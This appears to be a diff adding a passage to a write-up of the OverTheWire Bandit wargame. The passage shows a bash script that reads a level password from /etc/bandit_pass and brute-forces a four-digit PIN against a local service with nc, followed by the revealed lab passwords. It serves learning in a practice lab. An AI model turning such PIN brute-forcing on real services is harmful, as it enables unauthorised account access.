@@ -1163,3 +1163,26 @@ bandit24_password.log  script.sh
 bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ cat bandit24_password.log
 gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
+
+#### bandit24 --> bandit25
+
+```bash
+#!/bin/bash
+
+pass_bandit24=$(cat /etc/bandit_pass/bandit24)
+fichero_temporal=$(mktemp)
+
+for i in {0000..9999}; do
+        echo "${pass_bandit24} ${i}" >> ${fichero_temporal}
+done
+
+cat ${fichero_temporal} | nc localhost 30002 | grep -vE "Wrong|Please"
+```
+
+```bash
+bandit24@bandit:/tmp/tmp.Z9AMT4b2a6$ ./script.sh
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+#### bandit25 --> bandit26
